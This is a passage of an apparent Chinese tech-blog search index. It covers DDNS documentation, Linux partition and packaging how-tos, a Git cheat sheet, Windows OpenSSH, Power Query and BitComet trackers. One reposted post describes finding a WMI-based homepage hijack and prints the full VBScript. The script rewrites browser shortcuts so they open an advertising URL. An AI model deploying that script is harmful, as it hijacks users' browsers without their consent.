题外话\n\n从第8节的可以看出，Deepin可以完成不少的基础和进阶任务，但一些特定的专业软件没有Linux平台的版本，即便有，也有很大概率是英文版，不适合在从事这一类活动的企业中大面积推广。这决定了它目前只能在一些政府单位等行业等文书类工作比较集中的地方，至于这些人能不能/愿不愿意学这个东西就是另外一回事了。\n\n要说另一个好处就是适合仅限于“查资料/学习用途”的学生了，毕竟Linux平台下游戏少得可怜，质量还不好，即便是Steam平台有Linux版本，上面也有一些游戏，作为家长只要管控住银行卡，孩子们基本就没有什么游戏的空间。毕竟总不会有谁扫雷玩儿一天吧？不会吧？不会吧？","tags":["入门教程","Deepin","深度"],"categories":["日常"]},{"title":"HE DDNS服务文档","url":"/20200426/fc0f4387da81/","content":"\n原文链接：https://dns.he.net/docs.html\n\n本人对文档的python实现：https://github.com/Sergget/ddns_he\n\n以下为原文：\n\n## Getting started\n\nOur dynamic DNS service will allow you to update the IPv4 and IPv6 address of your A and AAAA records of domains that you manage using dns.he.net through the use of a simple web request or using any dyndns compatible client. We do not currently charge for this service. it is included for free with your dns.he.net account.\n\n## Basic Configuration\n\nTo use the dynamic DNS feature, you will first need to create a domain or subdomain (the zone) that you want to use with the dynamic DNS service. Once you have created the zone, you will want to create an ‘A’ and/or a ‘AAAA’ record. If you wish to use the dynamic service with the primary domain, leave the ‘Name’ box empty otherwise enter the subdomain name. (ie for the subdomain of example.com “house.example.com”, you would simply enter “house”.) Now click on the ‘enable entry for dynamic dns’ checkbox. The address field will be auto populated with your current address or the localhost address for the record type (for an ‘A’ record that would be 127.0.0.1. For a ‘AAAA’ record, this would be ::1 ) and the TTL will automatically be set to 300 (5 minutes). Submit then entry. You have just enabled a record to be dynamic.\n\nNote: The dynamic DNS update server uses the name of the record to determine what to update. Having more that one ‘A’ record or more than one ‘AAAA’ record will not have the desired effect.\n\nYou will be returned to the Edit Zone page. Dynamic records will be denoted with a pale blue row background as well as the icon (generate). Click on the icon to generate the password that will be used for dynamic DNS update client. As of this writing, you only need to generate one key per domain name (only one is necessary for both the ‘A’ and ‘AAAA’ records). Generating multiple passwords for a given domain name will likely not have the desired effect.\n\nNote: This behavior may change in the future as we make additional changes to the interface.\n\n## Basic Use\n\nUpdate requests can be sent over http or https. The site is currently using a self signed certificate that was generated by our security team.\n\n The most basic example:\n\n```\n https://[your domain name]:[your password]@dyn.dns.he.net/nic/update?hostname=[your domain name]\n```\n\n###  **Autodetect my IPv4/IPv6 address:**\n\n```\n% curl -4 \"https://dyn.example.com:password@dyn.dns.he.net/nic/update?hostname=dyn.example.com\"                                        \n% curl -6 \"https://dyn.example.com:password@dyn.dns.he.net/nic/update?hostname=dyn.example.com\"                                        \n```\n\n### **Specify my IPv4/IPv6 address:**\n\n```\n% curl \"https://dyn.example.com:password@dyn.dns.he.net/nic/update?hostname=dyn.example.com&myip=192.168.0.1\"\n% curl \"https://dyn.example.com:password@dyn.dns.he.net/nic/update?hostname=dyn.example.com&myip=2001:db8:beef:cafe::1\"\n```\n\n### **Authentication and Updating using GET**\n\nNote: The username is also the hostname. The password is sent using ‘password=’. This skips HTTP basic auth.\n\n```\n% curl \"https://dyn.dns.he.net/nic/update?hostname=dyn.example.com&password=password&myip=192.168.0.1\"\n% curl \"https://dyn.dns.he.net/nic/update?hostname=dyn.example.com&password=password&myip=2001:db8:beef:cafe::1\"\n```\n\n### **Authentication and Updating using a POST**\n\n```\n% curl \"https://dyn.dns.he.net/nic/update\" -d \"hostname=dyn.example.com\" -d \"password=password\" -d \"myip=192.168.0.1\"\n% curl \"https://dyn.dns.he.net/nic/update\" -d \"hostname=dyn.example.com\" -d \"password=password\" -d \"myip=2001:db8:beef:cafe::1\"\n```\n\n## Things to note about the dynamic DNS service\n\nYour “username” is going to be the name of the record that has been tagged dynamic. ie You marked the A record for dyn.example.com as dynamic. Your username will be “dyn.example.com” You can tag an A or AAAA record by editing it once you have selected the zone. (check the box). Once you have “activated” the record to be dynamic, you will need to generate a key (or password if you prefer) for it. (click on the generate icon) to generate the key for the dynamic record. If you have tagged both an A and AAAA record to be dynamic, you will see the icon twice, it is only necessary to generate one key as it is bound to the name of the record and not the name/type. When making updates, you will need to make a separate update for ipv4 and ipv6.\n\nNote:We may add an additional “myipv6=” option in the future.","tags":["DDNS","Hurricane Electric"],"categories":["运维"]},{"title":"将/home目录迁移到另一个分区","url":"/20200426/0cad07e5443e/","content":"   \n\n基本思路：\n\n```\n准备好新的分区 => 暂时挂载到中间挂载点 => 拷贝文件到中间挂载点 => 将新分区挂载到/home目录下\n```\n\n## 准备新分区\n\n使用fdisk工具进行分区：\n\n```\nsudo fdisk -l     #查看可用的设备\nsudo fdisk /dev/sdc    #开始分区，具体命令在工具内输入m获得帮助，分区完成后使用命令w保存退出\n```\n\n格式化分区\n\n```\nmkfs.ext4 /dev/sdc1/\n```\n\n## 暂时挂载到中间挂载点\n\n```\nmount /dev/sdc1 /media/home\n```\n\n## 拷贝文件到中间挂载点\n\n注意，我们需要确保在/home目录中不再写入新的信息，实现方法有两种：\n\n1. 查看正在使用/home目录的用户和进程，如果有就用wall命令通知用户保存文件并退出（或使用强硬手段：`fuser -km /home`—-直接将运行在/home的所有进程关闭）\n2. 进入单用户模式 `init 1`，**注意**：该模式没有网络链接，需要在实机上直接操作。\n\n任意选择一种方法后：\n\n```\ncp -a /home/* /media/home\n```\n\n## 将新分区挂载到/home目录下\n\n编辑`/etc/fstab`文件，并写入挂载信息：\n\n```\nsudo vim /etc/fstab\n# 写入挂载信息\n# <file system> <mount point> <type> <options> <dump> <pass>\n/dev/sdc1 /home ext4 defaults 0 0\n```\n\n保存退出后运行`sudo mount -a`使得配置生效","tags":["Ubuntu"],"categories":["运维"]},{"title":"将源码包编译成Deb包 – Checkinstall","url":"/20200418/6a36829358ea/","content":"  \n\n**翻译自：** https://help.ubuntu.com/community/CheckInstall\n\n## 1.简介\n\n`CheckInstall` 跟踪由`make install`或类似命令生成安装的所有文件，并创建`Slackware`, `RPM`或`Debian`包，将其添加到包的数据库，可以方便地卸载或分发软件包。\n\n使用`CheckInstall`来替代`sudo make install`，由于后者可能将文件安装到文件系统的各种位置，导致在出现问题的情况下卸载困难。而且如果将来你安装的某个软件包中的某些文件和你现在编译安装的某些文件相同，则会导致你编译安装的软件出错甚至停止工作。\n\n（实际上，不仅仅是`make install`，`CheckInstall`能跟踪任何命令所修改的文件，这是得它能够用于`apt`以外的的任何类型的软件包的安装，并使用包管理器跟踪其安装过程。）\n\n`CheckInstall`不适合用于生成用于发行目的的软件包。不要使用该软件来为Ubuntu archive或PPA源的软件打包。请遵循相应的打包方法。\n\nCheckInstall 的README文件：”CheckInstall对Debian的支持尚未稳定，请小心使用。对于某些Debian系的操作系统，用户反馈该软件包工作正常，当然它在我的已安装了dpkg的Slackware开发环境下表现良好，但是在你的环境里可能各有不同。”\n\n## 2.安装\n\n执行以下命令从软件仓库进行安装：\n\n```\nsudo apt-get update && sudo apt-get install checkinstall\n```\n\n## 3.使用\n\n编译安装时，不再使用：\n\n```\nsudo make install\n```\n\n而是：\n\n```\nsudo checkinstall\n```\n\n执行命令时不带任何参数，`checkinstall`则会默认调用`make install`。如果你需要使用其他参数，则可以这样使用：\n\n```\nsudo checkinstall make install_package\n```\n\n安装的包可以非常轻松地使用Synaptic或终端来删除：\n\n```\nsudo dpkg -r packagename\n```\n\n例如：\n\n```\nsudo dpkg -r pidgin\n```\n\n**注意：** 生成的`.deb`包也可以在其他地方使用，极大地简化了同一软件包在大量机器上的安装过程。\n\n## 4. 配合auto-apt使用checkinstall\n\n你也可以使用`auto-apt`与`checkinstall`配合，从源代码创建一个简单的软件包（需要安装`auto-apt`）：\n\n不再使用：\n\n```\n./configure\n```\n\n请使用:\n\n```\nauto-apt run ./configure\n```\n\n如果依赖都可用，一个对话框会被打开，并要求你安装它们，剩下的则保持不变：\n\n```\nmake\nsudo checkinstall\nRelated Links\nCategorySoftware CategoryCommandLine\n```","tags":["Ubuntu","apt"],"categories":["运维"]},{"title":"常用 Git 命令清单","url":"/20200418/41df35210044/","content":"    \n\n***本文转载自阮一峰的《[常用Git命令清单](http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html)》\\***\n\n我每天使用 Git ，但是很多命令记不住。\n\n一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要记住60～100个命令。\n\n![img](bg2015120901.png)\n\n下面是我整理的常用 Git 命令清单。几个专用名词的译名如下。\n\n- Workspace：工作区\n- Index / Stage：暂存区\n- Repository：仓库区（或本地仓库）\n- Remote：远程仓库\n\n## 一、新建代码库\n\n```\n# 在当前目录新建一个Git代码库\n$ git init\n\n# 新建一个目录，将其初始化为Git代码库\n$ git init [project-name]\n\n# 下载一个项目和它的整个代码历史\n$ git clone [url]\n```\n\n## 二、配置\n\nGit的设置文件为`.gitconfig`，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。\n\n```\n# 显示当前的Git配置\n$ git config --list\n\n# 编辑Git配置文件\n$ git config -e [--global]\n\n# 设置提交代码时的用户信息\n$ git config [--global] user.name \"[name]\"\n$ git config [--global] user.email \"[email address]\"\n```\n\n## 三、增加/删除文件\n\n```\n# 添加指定文件到暂存区\n$ git add [file1] [file2] ...\n\n# 添加指定目录到暂存区，包括子目录\n$ git add [dir]\n\n# 添加当前目录的所有文件到暂存区\n$ git add .\n\n# 添加每个变化前，都会要求确认\n# 对于同一个文件的多处变化，可以实现分次提交\n$ git add -p\n\n# 删除工作区文件，并且将这次删除放入暂存区\n$ git rm [file1] [file2] ...\n\n# 停止追踪指定文件，但该文件会保留在工作区\n$ git rm --cached [file]\n\n# 改名文件，并且将这个改名放入暂存区\n$ git mv [file-original] [file-renamed]\n```\n\n## 四、代码提交\n\n```\n# 提交暂存区到仓库区\n$ git commit -m [message]\n\n# 提交暂存区的指定文件到仓库区\n$ git commit [file1] [file2] ... -m [message]\n\n# 提交工作区自上次commit之后的变化，直接到仓库区\n$ git commit -a\n\n# 提交时显示所有diff信息\n$ git commit -v\n\n# 使用一次新的commit，替代上一次提交\n# 如果代码没有任何新变化，则用来改写上一次commit的提交信息\n$ git commit --amend -m [message]\n\n# 重做上一次commit，并包括指定文件的新变化\n$ git commit --amend [file1] [file2] ...\n```\n\n## 五、分支\n\n```\n# 列出所有本地分支\n$ git branch\n\n# 列出所有远程分支\n$ git branch -r\n\n# 列出所有本地分支和远程分支\n$ git branch -a\n\n# 新建一个分支，但依然停留在当前分支\n$ git branch [branch-name]\n\n# 新建一个分支，并切换到该分支\n$ git checkout -b [branch]\n\n# 新建一个分支，指向指定commit\n$ git branch [branch] [commit]\n\n# 新建一个分支，与指定的远程分支建立追踪关系\n$ git branch --track [branch] [remote-branch]\n\n# 切换到指定分支，并更新工作区\n$ git checkout [branch-name]\n\n# 切换到上一个分支\n$ git checkout -\n\n# 建立追踪关系，在现有分支与指定的远程分支之间\n$ git branch --set-upstream [branch] [remote-branch]\n\n# 合并指定分支到当前分支\n$ git merge [branch]\n\n# 选择一个commit，合并进当前分支\n$ git cherry-pick [commit]\n\n# 删除分支\n$ git branch -d [branch-name]\n\n# 删除远程分支\n$ git push origin --delete [branch-name]\n$ git branch -dr [remote/branch]\n```\n\n## 六、标签\n\n```\n# 列出所有tag\n$ git tag\n\n# 新建一个tag在当前commit\n$ git tag [tag]\n\n# 新建一个tag在指定commit\n$ git tag [tag] [commit]\n\n# 删除本地tag\n$ git tag -d [tag]\n\n# 删除远程tag\n$ git push origin :refs/tags/[tagName]\n\n# 查看tag信息\n$ git show [tag]\n\n# 提交指定tag\n$ git push [remote] [tag]\n\n# 提交所有tag\n$ git push [remote] --tags\n\n# 新建一个分支，指向某个tag\n$ git checkout -b [branch] [tag]\n```\n\n## 七、查看信息\n\n```\n# 显示有变更的文件\n$ git status\n\n# 显示当前分支的版本历史\n$ git log\n\n# 显示commit历史，以及每次commit发生变更的文件\n$ git log --stat\n\n# 搜索提交历史，根据关键词\n$ git log -S [keyword]\n\n# 显示某个commit之后的所有变动，每个commit占据一行\n$ git log [tag] HEAD --pretty=format:%s\n\n# 显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件\n$ git log [tag] HEAD --grep feature\n\n# 显示某个文件的版本历史，包括文件改名\n$ git log --follow [file]\n$ git whatchanged [file]\n\n# 显示指定文件相关的每一次diff\n$ git log -p [file]\n\n# 显示过去5次提交\n$ git log -5 --pretty --oneline\n\n# 显示所有提交过的用户，按提交次数排序\n$ git shortlog -sn\n\n# 显示指定文件是什么人在什么时间修改过\n$ git blame [file]\n\n# 显示暂存区和工作区的差异\n$ git diff\n\n# 显示暂存区和上一个commit的差异\n$ git diff --cached [file]\n\n# 显示工作区与当前分支最新commit之间的差异\n$ git diff HEAD\n\n# 显示两次提交之间的差异\n$ git diff [first-branch]...[second-branch]\n\n# 显示今天你写了多少行代码\n$ git diff --shortstat \"@{0 day ago}\"\n\n# 显示某次提交的元数据和内容变化\n$ git show [commit]\n\n# 显示某次提交发生变化的文件\n$ git show --name-only [commit]\n\n# 显示某次提交时，某个文件的内容\n$ git show [commit]:[filename]\n\n# 显示当前分支的最近几次提交\n$ git reflog\n```\n\n## 八、远程同步\n\n```\n# 下载远程仓库的所有变动\n$ git fetch [remote]\n\n# 显示所有远程仓库\n$ git remote -v\n\n# 显示某个远程仓库的信息\n$ git remote show [remote]\n\n# 增加一个新的远程仓库，并命名\n$ git remote add [shortname] [url]\n\n# 取回远程仓库的变化，并与本地分支合并\n$ git pull [remote] [branch]\n\n# 上传本地指定分支到远程仓库\n$ git push [remote] [branch]\n\n# 强行推送当前分支到远程仓库，即使有冲突\n$ git push [remote] --force\n\n# 推送所有分支到远程仓库\n$ git push [remote] --all\n```\n\n## 九、撤销\n\n```\n# 恢复暂存区的指定文件到工作区\n$ git checkout [file]\n\n# 恢复某个commit的指定文件到暂存区和工作区\n$ git checkout [commit] [file]\n\n# 恢复暂存区的所有文件到工作区\n$ git checkout .\n\n# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变\n$ git reset [file]\n\n# 重置暂存区与工作区，与上一次commit保持一致\n$ git reset --hard\n\n# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变\n$ git reset [commit]\n\n# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致\n$ git reset --hard [commit]\n\n# 重置当前HEAD为指定commit，但保持暂存区和工作区不变\n$ git reset --keep [commit]\n\n# 新建一个commit，用来撤销指定commit\n# 后者的所有变化都将被前者抵消，并且应用到当前分支\n$ git revert [commit]\n\n# 暂时将未提交的变化移除，稍后再移入\n$ git stash\n$ git stash pop\n```\n\n## 十、其他\n\n```\n# 生成一个可供发布的压缩包\n$ git archive\n```","tags":["Git"],"categories":["运维"]},{"title":"windows Ubuntu 双系统卸载Ubuntu","url":"/20200322/55e721974fc2/","content":"   \n\n1. 卸载前不要删除ubuntu的任何内容，开机在Grub引导选择进入windows\n2. 以管理员权限运行cmd或powershell，输入`bcdboot C:\\Windows` 一般Windows系统在C盘，如果有自定义，请自己修改盘符。\n3. 删除或格式化ubuntu的分区","tags":["Windows","双系统","Ubuntu"],"categories":["日常"]},{"title":"Windows 10 openSSH服务器","url":"/20200322/cacc638427dd/","content":"  \n\nwindows 10 默认安装启用了openssh客户端，cmd和powershell中可以直接使用ssh命令连接到各种linux主机，但是windows 10 1909版本也提供选装的ssh服务端。\n\n## 一、启用openssh服务端\n\n打开设置-应用-应用和可选功能：\n\n![img](屏幕截图1.png)\n\n进入“可选功能”-“添加功能”-“OpenSSH服务器”-“安装即可”：\n\n![img](屏幕截图2.png)\n\n安装完成后以管理员权限运行cmd或powershell，运行命令`net start sshd` ：\n\n```\nPS C:\\Windows\\system32> net start sshd\n OpenSSH SSH Server 服务正在启动 .\n OpenSSH SSH Server 服务已经启动成功。\n```\n\n然后在服务中打开`OpenSSH SSH Server` 和 `OpenSSH Authentication Agent` 服务，需要自动启动的，将其设置为自动\n\n## 二、Windows下openssh服务端的使用\n\n默认ssh进入的shell是cmd，可以运行命令`powershell`来使用powershell，考虑到powershell使用的频率很低，所以大部分情况下还是使用sftp传输文件。\n\n推荐的sftp客户端：FileZilla","tags":["Windows","SSH"],"categories":["日常"]},{"title":"Power query插件简介 — 强大的excel辅助工具","url":"/20200228/2bf772196f74/","content":"  \n\n## 前言\n\n一直以来，excel都是被作为一个表格制作工具而不是一个数据处理工具来使用，不少人判断一个人对于excel的熟练程度往往都是看他能不能熟练地在excel里面添加各种花里胡哨的样式，而不是根据业务实际判断其对数据的组织方式的合理性。\n\n本人在工作中使用excel做过大量的数据处理，然而，在引入较大量的数据比如100行以上的情况下，数据统计计算的复杂度就随着数据量的增长而成指数量级增长。\n\n因此对于大批量的数据，本人倾向于使用类似典型的关系数据库的设计方式，即1行记录1条数据进行存储，另开表格进行统计和计算。对于大批量的数据，利用excel自带的统计函数如SUMIF和AVERAGEIF在这种情况下就略显疲态，我们需要更强大的查询和统计工具。\n\n## power query简介\n\npower query是微软官方发布的一个excel插件，office 2016以上版本自带该工具，office 2010专业增强版、2013版本需要手动下载、安装[power query插件](https://www.microsoft.com/zh-CN/download/details.aspx?id=39379)。\n\n本文以office 2016版本为例，介绍power query的基本使用方法。2019版界面略有变化，请自行试验。\n\n## 先决知识\n\n- 基本的Excel公式知识。\n- 透视表的基本概念。\n\n## power query编辑的基本思路\n\n### 1、数据存储与数据处理\n\n了解一些编程语言的读者应该清楚的一个原则是，我们需要将数据的存储与数据的处理分开，数据的存储应由处理数据的程序写入文件或者数据库、存储在硬盘上，在需要进行数据处理时，由程序将数据读取到内存中进行增删改查等操作。数据库程序作为数据处理的部分，则是常驻在内存中，而数据本身只有在需要的时候才会被读取，以减少内存占用。power query实际上就是提供了一个图形界面，用于编写和维护上述的处理数据的程序，我们不需要关心内存管理的问题。在power query处理过程中，我们需要关心的是数据处理的结果（power query生成的结果表格）与源数据的分离。\n\n### 2、power query维护数据关系\n\n由1我们知道，power query编辑的是`数据源 ====> 统计结果`的映射，我们维护的是这一对应关系，在后续有任何数据增加、更新时，我们只需要点击`刷新`按钮，power query 会根据我们事先编辑好地规则处理源数据，然后跟新最新的结果，不再是像传统的编辑excel表格的方式；\n\n![img](query-1.png)\n\n### 3、power query不直接修改行数据\n\n正是因为power query预设的工作环境是源数据在不断变化，所以更改某一具体的行或单元格的数据是没有意义的，因为这个数据可能在下一次业务数据刷新之后就消失了，所以在编辑器中的操作都是在构建一个对源数据的处理规则，而不是编辑具体的数据；在编辑器中，所有的操作基本对象是1列，我们对数据的控制的永远是对一整列进行操作，比如替换字符串的操作，power query不提供对某一些具体的单元格范围内的字符串进行查找、替换的功能，一个替换操作的最小单位是1列数据。正是因为我们对一整列进行操作，因此一列的数据必须要是同一类型且表示同一个含义。只有这样的数据，在我们进行批量操作时才有意义。\n\n### 4、关系的鲁棒性\n\n鲁棒性是在写代码中非常常见的一个词，音/意译自英语`robust`，实际上翻译成`健壮性`更容易理解，但是`鲁棒`这个翻译实在是太接地气了，又`“鲁”`又`“棒”`。不论是哪种翻译，都是在说程序的代码需要足够的稳定、健全。可是，\n\n![img](shenme.png)\n\n我们前面提到，power query编辑的是`数据源 ====> 统计结果`的映射，这个映射是靠一步一步的步骤处理每一列来实现的，因此我们需要尽可能考虑到每一步都应全面考虑到这一步出现的所有可能情况，保证数据源数据的合法性和power query中编辑步骤的全面性。比如，分解日期列就需要保证数据源这一列全部是合理的日期。替换不需要的符号的时候就需要将所有可能出现的不需要的符号全部替换掉，即便当前数据中没有出现。如果没有考虑到所有的情况，在后续更新数据时很有可能出现某一步报错，造成后续步骤报错无法处理。这个时候再来排查错误就会非常耗时。\n\n## 基本的工作流程\n\n对于一个基本的Power query的使用，我们首先需要准备如下的内容：\n\n- 1行存储1条数据的数据源，文中使用了一个随机生成的数据列表作为示例\n- 已安装了power query插件的excel\n\n以上准备完成，我们就可以开始创建一个query：\n\n1、打开空excel表格，切换到`数据`标签，可以看到左面的标签有几个不同的数据导入来源，由于我们刚刚开始，因此，我们选择`新建查询(New Query)` => `来自文件(From File)` => `来自工作簿(From Workbook)`，然后选择上面准备的数据源。\n\n![img](1.png)\n\n2、选择`编辑（Edit）`，进入power query编辑器。 \n\n![img](2.png)\n\n3、进入编辑器后，我们可以看到一共提供了4个编辑标签页，其中前3个是我们经常使用的功能：`主页(home)`、`转换(transform)`、`添加列(add column)` \n\n![img](3-1.png)\n\n4、在主页标签下，我们可以数据分组统计计算、管理列（删除）、行（删除错误行，前n行，后n行），进行排序、分列、合并查询(merge query)、添加查询(append query)等操作\n\n5、在转换标签下，我们可以调整列的数据类形，替换值，透视列或者反透视列，对列的数据进行计算，分析、格式化日期时间等操作\n\n![img](4-1.png)\n\n6、在添加列标签下，我们可以在保留原数据列的前提下，进行计算、解析并新增列。\n\n![img](5-1.png)\n\n在power query中，最常用的功能是`分组(group by)`，合并查询(常用成多条件vlookup)、添加查询(同一类表格数据的合并)、日期时间解析和字符串的处理，这几项功能是我们在处理批量数据中最需要的功能，对批量的数据进行分组统计、并分配好对应的时间、分类之后得到的最终数据，即可再使用excel自带的透视图标进行分析。\n\n如果你需要一个源数据分多个透视表进行分析，也可以在power query中在某一步查询后复制查询，作为同一个数据源的分支，另行处理数据至想要的状态。\n\n7、处理数据后，我们点击主页标签下的`关闭并上载(close & load)`即可将编辑后的数据导入到excel表格中。\n\n![img](7.png)\n\npower query生成的数据会新开一个标签，不会覆盖当前的工作表。上载数据后，我们会发现，当我们选中任意一个由power query生成的数据单元格的时候，excel会多出两个标签，`表设计`和`查询`，后续如果发生数据更新时，直接点击`查询`标签下的`刷新`即可。\n\n![img](8.png)\n\n**注意:** 请在创建查询之前就将数据源表格放在你最终需要它们的文件夹下，否则事后移动数据源文件会导致查询找不到文件。\n\n8、当然，我们可以更改每一步步骤的参数，在编辑器的右边提供了步骤窗口，我们可以在这个窗口插入、删除、修改步骤：\n\n![img](9.png)\n\n- 插入步骤：选中你想要插入步骤的位置的前一个步骤，然后在标签页进行需要插入的操作即可；\n- 删除步骤：点击每一步前面的叉即可\n- 修改步骤：能够修改的步骤在后面都有一个齿轮，点击齿轮则会弹出这一步骤的操作窗口\n\n因此如果我们移动了工作簿的位置，就可以点点击`源(Source)`，并找到移动后的源数据工作簿的位置。\n\n## 结语\n\npower query 实际上是帮助我们方便地将数据源和数据结果分离的工具，作为真正的自动化工具非常适合各类市场、销售、运营等部门使用，配合透视图表能够自动化、可视化地更新各种日常化的数据，能够为制作报表的人员节省大量的时间，并且还能确保数据格式、图表规则的统一性。\n\n关于分组、合并查询、添加查询等功能具体教程会在后续继续增加，敬请期待。当然，你也可以自行尝试摸索，我相信自己摸索出来的知识远比看教程记得要牢固的多。\n\n## 题外话\n\n对于互联网公司或者自行运行了sql数据库的大型企业，更适合使用微软基于power query、power map等工具研发的Power BI，它从数据库等获得数据源、通过查询工具加工处理，再通过power map 和透视图表和其他可视化部件直观地展现当前的运营状态等数据，同时还提供了移动端的报表面板，非常适合各种大型企业使用。","tags":["Excel","Powerquery"],"categories":["Office"]},{"title":"抛弃迅雷，投入BT的怀抱吧","url":"/20200205/2672a7215b6a/","content":" \n\n由于最近的特殊情况，不得不宅在家中（其实没这档子事儿我也乐意待家里），于是乎就下载了大量的电影，迅雷加速基本和百度网盘一个性质，本人都没有购买会员，通过bt种子或磁力链接进行下载。并且可以跑满带宽上限。下面就分享下：\n\n## 客户端\n\n我是用的客户端是比特彗星[bitcomet](http://www.bitcomet.com/)，所谓的登录和上传升级加速之类的都是扯淡，实际当中考虑到这些bt客户端往往都有防吸血的功能，因此，上传的限速不要太过分就可以了。\n\n也可以考虑使用uTorrent客户端或者uTorrent web。\n\n## 添加Tracker\n\n### Tracker是什么？\n\n我们知道BT下载或者磁力下载是一种去中心化的网络内容分发的机制，每个人既是下载的，也是上传的，没人做种，也就没法下载。做种的人越多，你下载的速度就能越快，但是这并不是完全意义上的去中心化，因为你不知道有谁在做种。\n\n因此我们需要中心化的服务器，来将大家上传和下载的请求信息进行交换，然后各个客户端各自进行连接交换数据。\n\n### 为什么添加Tracker?\n\n简单地说， **优质的 Tracker，可以有效提高资源解析速度及下载速度。** **同时，用这些 Tracker 的人越多，大家的下载速度就越快**。\n\n### 向比特彗星添加Tracker\n\n点击[链接](http://www.bitcomet.com/en/downloads)下载比特彗星，安装完成后，可能是默认为英语，选择工具栏的Tools => Language => Chinese\n\n更改语言后，添加Tracker服务器的订阅链接。Github的XIU2汇总了一些优质的Tracker列表:\n\n- 项目地址： https://github.com/XIU2/TrackersListCollection\n- 项目网站： https://trackerslist.com/#/zh\n\n项目提供了两个订阅列表：\n\n- 精选版： https://trackerslist.com/best.txt\n- 完整版： https://trackerslist.com/all.txt\n\n请选择上面任意一个链接，复制。打开比特彗星 => 工具 => 人物设置 => Tracker => 勾选”每天自动更新Tracker服务器列表”，然后在下面的输入框内粘贴刚才复制的订阅列表，点击立即更新，确定即可。\n\n![img](捕获-2.png)","tags":["BT","Bitcommet","比特彗星"],"categories":["日常"]},{"title":"Linux如何查看CPU温度","url":"/20200127/8692915cd465/","content":" \n\n## CentOS系列\n\n```\nyum install lm_sensors;\nsensors-detect\nsensors\n```\n\n## Ubuntu系列\n\n```\napt-get install lm-sensors\nsensors-detect\nservice kmod start\nsensors\n```\n\n注意:根据提示选择yes/no\n\n最后的信息大致如下:\n\n```\ncoretemp-isa-0000\nAdapter: ISA adapter\nCore 0:       +38.0°C  (high = +76.0°C, crit = +100.0°C)\nCore 1:       +32.0°C  (high = +76.0°C, crit = +100.0°C)\n```\n\n最后,由于驱动升级等原因,以上的命令可能会发生一些改变,所以只能作为参考.","tags":["Linux"],"categories":["运维"]},{"title":"WMI脚本劫持浏览器","url":"/20200126/77359fa66f24/","content":"\n转载自： https://zhuanlan.zhihu.com/p/24216079\n\n用了许多年的 Mac 后，我又用回了 Windows。\n\n但最近却遇到个坑爹的问题——我的浏览器首页被劫持了。\n\n一开始的时候我是懵逼的，我看到我的浏览器设置里的首页是完全正常的，但为什么一打开浏览器就去了 [http://hao916.com](https://link.zhihu.com/?target=http%3A//hao916.com) 然后跳转到 [http://hao123.com](https://link.zhihu.com/?target=http%3A//hao123.com) 了呢？\n\n后来发现，原来是浏览器的快捷方式被修改了…………\n\n![img](image-1.jpeg)\n\n那好办，删掉后面的链接不就好了。\n\n但事实证明，毕竟我还是太年轻……后面的链接过了一段时间又回来了…………\n\n于是我就对系统查了个遍。\n\n进程？启动项？没异常啊。\n\n服务？计划任务？也没看到啥可疑的。\n\n那还可能是什么？？？？？？？ I’m angry！\n\n于是我开出了 Process Monitor。你再怎么样总得操纵这个文件吧，我就守在这里，盯着这个快捷方式，看你什么时候出动了我就把你抓了。\n\n终于，皇天不负有心人……\n\n凶手就是你了！scrcons.exe！\n\n（老大！我是无辜的！我可是地地道道的系统程序啊！）\n\n诶，这么一说也对啊。\n\n于是我就去查了一下……原来有 WMI 这种东西。这还真是搞后门的好东西。\n\n用 WMI Event Viewer 一看，原来如此……\n\n删掉即可。\n\n最后附上脚本代码：  \n\n```\nOn Error Resume Next:Const link =\n\"http://hao916.com/?r=yx37n&m=d1\":Const link360 = \"http://hao916.com/?r=yx37n&m=d1&s=3\":browsers =\n\"114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe\":lnkpaths\n= \"C:\\Users\\Public\\Desktop,C:\\ProgramData\\Microsoft\\Windows\\Start\nMenu\\Programs,C:\\Users\\sticn\\Desktop,C:\\Users\\sticn\\AppData\\Roaming\\Microsoft\\Internet\nExplorer\\Quick Launch,C:\\Users\\sticn\\AppData\\Roaming\\Microsoft\\Internet\nExplorer\\Quick Launch\\User Pinned\\StartMenu,C:\\Users\\sticn\\AppData\\Roaming\\Microsoft\\Internet\nExplorer\\Quick Launch\\User\nPinned\\TaskBar,C:\\Users\\sticn\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\":browsersArr = split(browsers,\",\"):Set oDic =\nCreateObject(\"scripting.dictionary\"):For Each browser In\nbrowsersArr:oDic.Add LCase(browser), browser:Next:lnkpathsArr =\nsplit(lnkpaths,\",\"):Set oFolders =\nCreateObject(\"scripting.dictionary\"):For Each lnkpath In\nlnkpathsArr:oFolders.Add lnkpath, lnkpath:Next:Set fso = CreateObject(\"Scripting.Filesystemobject\"):Set\nWshShell = CreateObject(\"Wscript.Shell\"):For Each oFolder In\noFolders:If fso.FolderExists(oFolder) Then:For Each file In\nfso.GetFolder(oFolder).Files:If LCase(fso.GetExtensionName(file.Path)) =\n\"lnk\" Then:Set oShellLink = WshShell.CreateShortcut(file.Path):path =\noShellLink.TargetPath:name = fso.GetBaseName(path) & \".\" &\nfso.GetExtensionName(path):If oDic.Exists(LCase(name)) Then:If LCase(name) =\nLCase(\"360se.exe\") Then:oShellLink.Arguments =\nlink360:Else:oShellLink.Arguments = link:End If:If file.Attributes And 1\nThen:file.Attributes = file.Attributes - 1:End If:oShellLink.Save:End If:End\nIf:Next:End If:Next:\n```","tags":["Windows","浏览器首页"],"categories":["日常"]},{"title":"uTorrent去掉左下角广告和升级提示","url":"/20200126/fa85b267ec09/","content":" \n\n打开uTorrent ,选项->设置->高级,将下面这几条的true改成false:\n\n- offers.sponsored_torrent_offer_enabled/\n- 